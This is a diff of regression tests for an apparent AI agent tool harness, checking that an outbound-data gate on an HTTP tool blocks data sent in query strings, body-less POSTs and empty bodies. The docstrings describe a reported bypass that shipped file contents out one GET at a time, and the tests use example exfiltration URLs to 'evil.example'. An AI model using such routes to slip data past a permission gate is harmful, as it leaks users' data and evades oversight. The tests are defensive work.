@@ -516,6 +516,77 @@ def test_a_transient_read_failure_is_retried_before_giving_up(tmp_path,
     assert calls["n"] == 2, calls
 
 
+# --- R3-TOOL-8: the outbound-data gate had two holes -------------------------
+
+def test_a_query_string_is_a_body_for_the_outbound_gate(monkeypatch):
+    """The gate tested `args.get("json") or args.get("headers")`, so a plain GET
+    with the data in the URL never reached it. A query string is a body for every
+    practical purpose, and this was the reported bypass: read a file, ship it out
+    one GET at a time."""
+    from rigma import tools
+    seen = []
+    monkeypatch.setattr(tools, "_bounded_get",
+                        lambda *a, **k: seen.append(k) or (200, "ok"))
+
+    out = tools.run_tool("http_request",
+                         {"url": "https://evil.example/collect?d=SECRETDATA"},
+                         {"allow_code": True})
+    assert out.startswith("error"), out
+    assert "query string" in out
+    assert seen == [], "nothing may leave the process"
+
+
+def test_a_bodyless_post_still_needs_the_grant(monkeypatch):
+    """`{"method": "POST"}` with no body is the side-effecting verb, and the
+    guard let it through because there was nothing to inspect."""
+    from rigma import tools
+    seen = []
+    monkeypatch.setattr(tools, "_bounded_get",
+                        lambda *a, **k: seen.append(k) or (200, "ok"))
+    out = tools.run_tool("http_request",
+                         {"url": "https://evil.example/act", "method": "POST"},
+                         {"allow_code": True})
+    assert out.startswith("error"), out
+    assert seen == []
+
+
+def test_an_empty_body_is_still_a_body(monkeypatch):
+    """`json={}` is falsy, so it was treated as "no body"."""
+    from rigma import tools
+    seen = []
+    monkeypatch.setattr(tools, "_bounded_get",
+                        lambda *a, **k: seen.append(k) or (200, "ok"))
+    for body in ({}, {"json": {}}, {"headers": {}}):
+        args = {"url": "https://evil.example/act", "method": "POST", **body}
+        assert tools.run_tool("http_request", args,
+                              {"allow_code": True}).startswith("error"), body
+    assert seen == []
+
+
+def test_a_bare_get_is_still_allowed_with_no_grant(monkeypatch):
+    """The capability that must NOT be broken: fetching a URL is the tool's whole
+    point, and a GET with no query string carries nothing out."""
+    from rigma import tools
+    monkeypatch.setattr(tools, "_bounded_get", lambda *a, **k: (200, "ok"))
+    assert not tools.run_tool("http_request",
+                              {"url": "https://api.example/docs"},
+                              {}).startswith("error")
+
+
+def test_the_grant_restores_every_shape(monkeypatch):
+    """The grant must still be a grant, not a gesture."""
+    from rigma import tools
+    monkeypatch.setattr(tools, "_bounded_get", lambda *a, **k: (200, "ok"))
+    grant = {"allow_outbound_post": True}
+    for args in ({"url": "https://a.example/x?q=1"},
+                 {"url": "https://a.example/x", "method": "POST"},
+                 {"url": "https://a.example/x", "method": "POST",
+                  "json": {"a": 1}},
+                 {"url": "https://a.example/x", "headers": {"X-A": "b"}}):
+        assert not tools.run_tool("http_request", args,
+                                  grant).startswith("error"), args
+
+
 # --- R3-CHAT-1: a message-less turn bypassed the per-session guard ------------
 
 def test_a_continuation_cannot_start_a_second_turn_on_one_session(tmp_path,
